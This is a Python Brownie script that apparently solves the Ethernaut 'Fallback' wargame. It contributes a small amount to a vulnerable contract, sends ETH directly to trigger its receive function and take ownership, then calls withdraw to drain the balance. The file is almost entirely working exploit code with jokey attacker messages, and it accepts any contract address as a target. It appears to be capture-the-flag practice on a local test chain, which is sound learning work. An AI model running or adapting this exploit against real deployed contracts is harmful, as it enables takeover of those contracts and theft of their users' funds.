#!/usr/bin/python3
from brownie import interface
from colorama import Fore
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account
from web3 import Web3

# ? Global variables
AMOUNT = 0.00002
CONVERTED_AMOUNT = Web3.toWei(AMOUNT, "ether")

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def attack(contract_address=None, attacker=None):
    if contract_address is None:
        fallback_contract, owner = deploy()
        contract_address = fallback_contract.address
        # ? Geeting the accounst for local testing
        _, attacker = get_account()

    # print(contract_address)
    # print(attacker)
    # exit(1)

    fallback_contract = interface.Fallback(contract_address)
    owner = fallback_contract.owner()
    print(f"Previous Address of the owner : {green}{owner}{reset}")
    # exit(1)
    contrib_tx = fallback_contract.contribute(
        {"from": attacker, "value": CONVERTED_AMOUNT}
    )
    contrib_tx.wait(1)

    print(f"{green}Contributed {AMOUNT} ETH to the contract{reset}")
    print(
        f"Contract Balance: {green}{Web3.fromWei(fallback_contract.balance(), 'ether')} ETH{reset}"
    )

    # exit(2)
    # ? Invoking the fallback fn. i.e. the recieve() methind in solidity which enables a contract to accept payments

    print(f"{red}Doing the Attack by invoking the fallback fn.{reset}")
    attack_tx = attacker.transfer(contract_address, CONVERTED_AMOUNT)
    attack_tx.wait(1)

    print(f"Previous Address of the owner : {green}{owner}{reset}")
    print(f"Current Address of the owner : {green}{fallback_contract.owner()}{reset}")
    print(f"Address of the attacker : {green}{attacker}{reset}")
    print(f"{red}Hehe Wer're now the owner{reset}")

    # ? Draining the funds
    print(f"{magenta}Now Draining the funds!!!{reset}")

    drain_tx = fallback_contract.withdraw({"from": attacker})
    drain_tx.wait(1)

    print(f"Contract Balance: {green}{fallback_contract.balance()}{reset}")
    print(f"{red}All the money has been withdrawn!!{reset}")


def main(contract_address=None):
    if contract_address:
        attack(contract_address, get_account())
    else:
        attack()
